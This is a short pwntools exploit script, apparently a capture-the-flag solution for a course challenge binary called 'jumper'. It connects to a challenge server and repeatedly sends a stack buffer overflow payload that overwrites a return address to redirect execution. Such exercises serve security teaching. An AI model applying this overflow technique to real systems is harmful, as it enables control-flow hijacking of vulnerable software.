from pwn import *

context.log_level = ("INFO")
context.terminal = ["tmux", "splitw", "-f", "-h"]
target_file = "./jumper"

LOCAL = False

if LOCAL:
    p = process(target_file)
    # p = gdb.debug(target_file, '''
    # b main
    # b get_input
    # continue
    # ''')
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1283)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")

for i in range(9):
    print(i)
    p.recvuntil(b"jump?\n\t> ")
    add_to_height_offset = 0x00401262
    payload = (b'B' * 0x38) + p64(add_to_height_offset)
    p.send(payload)

p.recvuntil(b"jump?\n\t> ")
p.send(b'Very high')
p.interactive()
